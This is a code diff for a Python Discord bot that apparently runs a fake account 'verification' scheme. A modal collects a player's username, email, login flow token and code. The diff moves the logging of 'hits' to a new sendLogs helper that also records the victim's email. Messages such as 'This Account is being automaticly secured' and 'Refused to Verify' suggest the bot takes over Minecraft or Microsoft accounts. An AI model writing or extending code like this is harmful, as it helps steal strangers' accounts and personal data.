@@ -10,6 +10,7 @@ from views.buttons.accountInfo import accountInfo
 
 from views.utils.startSecure import startSecuringAccount
 from views.utils.initialSession import getSession
+from views.utils.sendLogs import sendLogs
 
 class MyModalTwo(ui.Modal):
     def __init__(self, username, email, flowtoken):
@@ -24,7 +25,6 @@ class MyModalTwo(ui.Modal):
         code = self.children[0].value
 
         print(f"Usernameo: {self.username}")
-        logs_channel = await interaction.client.fetch_channel(self.config["discord"]["logs_channel"])
         hits_channel = await interaction.client.fetch_channel(self.config["discord"]["accounts_channel"])
 
         # Blacklisted Users
@@ -39,14 +39,16 @@ class MyModalTwo(ui.Modal):
                     ephemeral = True
                 )
 
-                await logs_channel.send(
-                    embed = Embed(
+                await sendLogs(
+                    interaction.client, self.config,
+                    Embed(
                         title = f"User | {interaction.user.name} ({interaction.user.id})",
                         description = f"**Email** | **Status** | **Reason**\n```{self.email} | Refused to Verify | User has been blacklisted```",
                         timestamp = datetime.datetime.now(),
-                        colour = 0xFF5C5C                         
+                        colour = 0xFF5C5C
                     ).set_thumbnail(url=f"https://visage.surgeplay.com/full/512/{self.username}"),
-                    view = ButtonOptions(interaction.user)
+                    view = ButtonOptions(interaction.user),
+                    email = self.email
                 )
                 return
 
@@ -63,8 +65,8 @@ class MyModalTwo(ui.Modal):
 
         await interaction.response.defer(ephemeral=True)
 
-        await logs_channel.send("**This Account is being automaticly secured**")
-        await logs_channel.send(embed = embed, view = ButtonOptions(interaction.user.id))
+        await sendLogs(interaction.client, self.config, content="**This Account is being automaticly secured**")
+        await sendLogs(interaction.client, self.config, embed, view=ButtonOptions(interaction.user.id), email=self.email)
 
         await interaction.followup.send(
             embed = discord.Embed(
@@ -92,9 +94,11 @@ class MyModalTwo(ui.Modal):
             if self.username and self.username.strip():
                 embed.set_thumbnail(url=f"https://visage.surgeplay.com/full/512/{self.username}")
             
-            await logs_channel.send(
-                embed = embed,
-                view = ButtonOptions(interaction.user)
+            await sendLogs(
+                interaction.client, self.config,
+                embed,
+                view=ButtonOptions(interaction.user),
+                email=self.email
             )
 
             return
